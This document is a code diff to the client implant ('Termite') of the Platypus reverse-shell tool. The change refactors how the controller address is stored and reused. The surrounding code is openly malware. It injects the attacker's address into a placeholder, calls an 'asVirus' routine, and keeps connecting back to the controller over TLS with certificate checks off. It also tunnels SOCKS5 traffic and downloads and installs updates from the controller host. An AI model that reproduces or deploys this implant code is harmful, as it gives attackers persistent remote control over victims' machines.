@@ -24,6 +24,7 @@ import (
 	"github.com/WangYihang/Platypus/internal/util/hash"
 	"github.com/WangYihang/Platypus/internal/util/log"
 	"github.com/WangYihang/Platypus/internal/util/message"
+	"github.com/WangYihang/Platypus/internal/util/network"
 	"github.com/WangYihang/Platypus/internal/util/str"
 	"github.com/WangYihang/Platypus/internal/util/update"
 	"github.com/armon/go-socks5"
@@ -83,12 +84,13 @@ var pushTunnels map[string]*net.Conn
 var socks5ServerListener *net.Listener
 
 type client struct {
-	Conn        *tls.Conn
-	Encoder     *gob.Encoder
-	Decoder     *gob.Decoder
-	EncoderLock *sync.Mutex
-	DecoderLock *sync.Mutex
-	Service     string
+	Conn         *tls.Conn
+	Encoder      *gob.Encoder
+	Decoder      *gob.Decoder
+	EncoderLock  *sync.Mutex
+	DecoderLock  *sync.Mutex
+	PlatypusHost string
+	PlatypusPort uint16
 }
 
 func handleConnection(c *client) {
@@ -281,6 +283,7 @@ func handleConnection(c *client) {
 					Python2:           python2,
 					Python3:           python3,
 					NetworkInterfaces: interfaces,
+					PlatypusHost:      c.PlatypusHost,
 				},
 			})
 			c.EncoderLock.Unlock()
@@ -676,14 +679,8 @@ func handleConnection(c *client) {
 			token := msg.Body.(*message.BodyUpdate).Token
 			distributorPort := msg.Body.(*message.BodyUpdate).DistributorPort
 			version := msg.Body.(*message.BodyUpdate).Version
-			// Parse platypus endpoint host
-			parts := strings.Split(c.Service, ":")
-			if len(parts) != 2 {
-				continue
-			}
-			host := parts[0]
 			// Construct new binary download url
-			url := fmt.Sprintf("http://%s:%d/%s", host, distributorPort, token)
+			url := fmt.Sprintf("http://%s:%d/%s", c.PlatypusHost, distributorPort, token)
 			log.Info("Upgrading from v%s to v%s", update.Version, version)
 			log.Info("Downloading %s into %s", url, exe)
 			if err := selfupdate.UpdateTo(url, exe); err != nil {
@@ -724,7 +721,7 @@ func stopSocks5Server() error {
 	return (*socks5ServerListener).Close()
 }
 
-func startClient(service string) bool {
+func startClient(platypusAddr string) bool {
 	needRetry := true
 	certBuilder := new(strings.Builder)
 	keyBuilder := new(strings.Builder)
@@ -740,9 +737,11 @@ func startClient(service string) bool {
 	}
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
-		log.Debug("Connecting to: %s", service)
-		conn, err := tls.Dial("tcp", service, &config)
+	// It means that the platypus address changed when the hash dismatched
+	// md5("AAAA....DDDD:65535") == "09224e9df91cd6f9e0117d185556528a"
+	if hash.MD5(platypusAddr) != "09224e9df91cd6f9e0117d185556528a" {
+		log.Debug("Connecting to: %s", platypusAddr)
+		conn, err := tls.Dial("tcp", platypusAddr, &config)
 		if err != nil {
 			log.Error("client: dial: %s", err)
 			return needRetry
@@ -756,13 +755,19 @@ func startClient(service string) bool {
 
 		log.Success("Secure connection established on %s", conn.RemoteAddr())
 
+		pHost, pPort, err := network.ParseHostPort(platypusAddr)
+		if err != nil {
+			return !needRetry
+		}
+
 		c := &client{
-			Conn:        conn,
-			Encoder:     gob.NewEncoder(conn),
-			Decoder:     gob.NewDecoder(conn),
-			EncoderLock: &sync.Mutex{},
-			DecoderLock: &sync.Mutex{},
-			Service:     service,
+			Conn:         conn,
+			Encoder:      gob.NewEncoder(conn),
+			Decoder:      gob.NewDecoder(conn),
+			EncoderLock:  &sync.Mutex{},
+			DecoderLock:  &sync.Mutex{},
+			PlatypusHost: pHost,
+			PlatypusPort: pPort,
 		}
 		handleConnection(c)
 		return needRetry
@@ -797,7 +802,7 @@ func asVirus() {
 
 func main() {
 	release := true
-	service := "127.0.0.1:13337"
+	platypusAddr := "127.0.0.1:13337"
 	/*
 		Each element of a domain name separated by [.] is called a “label.”
 		The maximum length of each label is 63 characters, and a full domain
@@ -805,7 +810,7 @@ func main() {
 	*/
 	// Remote address string placeholder
 	if release {
-		service = strings.Trim(config.RemoteAddrPlaceHolder, " ")
+		platypusAddr = strings.Trim(config.RemoteAddrPlaceHolder, " ")
 		asVirus()
 	}
 
@@ -817,7 +822,7 @@ func main() {
 
 	for {
 		log.Info("Termite (v%s) starting...", update.Version)
-		if startClient(service) {
+		if startClient(platypusAddr) {
 			add := (int64(rand.Uint64()) % backoff.Current)
 			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
 			backoff.Sleep(add)
